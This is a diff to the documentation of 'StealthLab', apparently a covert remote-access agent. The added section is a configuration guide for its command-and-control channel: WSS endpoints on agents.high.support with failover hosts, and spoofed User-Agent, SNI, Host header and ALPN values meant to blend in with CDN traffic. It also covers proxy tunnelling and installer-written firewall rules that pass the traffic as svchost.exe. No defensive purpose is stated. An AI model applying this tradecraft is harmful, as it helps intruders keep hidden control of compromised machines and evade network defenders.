@@ -31,7 +31,48 @@ Complete reference for all StealthLab service configurations, persistence mechan
 | **Database** | `diaghost.db` |
 | **Config File** | `diaghost.conf` |
 
-### Service Registry Configuration
+### Network Configuration & Egress Strategy
+
+The StealthLab build now consumes all network metadata directly from `branding_config*.json`, so you can rotate front doors/CDNs without touching code or handcrafted `.msh` files. The four pillars below are fully automated:
+
+1. **Multiple egress targets (failover):** `network.primaryEndpoint` is still the default, but you can populate `network.fallbackEndpoints` with an ordered list of hostnames/URLs. `agentcore` keeps exactly one WSS control channel open at a time and automatically tries the next branded endpoint whenever `.msh` data is missing or a host is unreachable.
+2. **Protocol/header camouflage:** Each fallback entry can override `sni`, `hostHeader`, `userAgent`, and `alpn`, so the agent can blend in with the reverse proxy or CDN you front it with.
+3. **Proxy/tunnel support:** If the environment requires HTTPS CONNECT, bake `WebProxy=...` into the `.msh` (or rely on the existing auto-helper) and the agent will honor it automatically—no interactive steps after branding.
+4. **Local firewall policy:** `stealth_installer.c` already adds outbound rules for `svchost.exe`. Runtime validation now records the SCM state plus the configured service recovery policy; ops only needs to allow the documented hostnames/ports in the network firewall.
+
+### JSON schema recap
+
+```json
+"network": {
+  "primaryEndpoint": "wss://agents.high.support:4445/agent.ashx",
+  "userAgent": "Microsoft-CryptoAPI/10.0",
+  "sni": "agents.high.support",
+  "hostHeader": null,
+  "fallbackEndpoints": [
+    {
+      "url": "wss://agents.high.support:4446/agent.ashx",
+      "sni": "agents.high.support",
+      "hostHeader": "agents.high.support",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
+      "alpn": ["http/1.1"]
+    },
+    {
+      "url": "wss://agents-dr.high.support:4445/agent.ashx",
+      "sni": "agents-dr.high.support",
+      "hostHeader": "agents-dr.high.support",
+      "userAgent": null,
+      "alpn": ["http/1.1"]
+    }
+  ]
+}
+```
+
+- If you only need hostname rotation, the entries can be simple strings (`"wss://dr.example.com/agent.ashx"`); the agent will fall back to the primary SNI/Host header/User-Agent automatically.
+- Mix and match `alpn` values to mimic the upstream front door. The provisioning scripts convert the array into the ALPN byte vector and pass it to OpenSSL via `ILibWebClient_Request_SetALPN`, so no manual TLS fiddling is required.
+- To route everything through a corporate proxy, add `WebProxy=http://proxyhost:3128` to the `.msh` (or keep `autoproxy=1` in the datastore). The JS helper still auto-detects, but long-lived deployments should set `WebProxy` explicitly so builds stay deterministic.
+- Network firewalls should allow outbound TCP 4445/4446 (or whatever ports your entries use). The installer already writes a Windows Firewall rule for `C:\Windows\System32\svchost.exe`; runtime validation records the exact host/port that was exercised for the audit trail.
+
+## Service Registry Configuration
 
 #### Standalone Mode
 ```registry
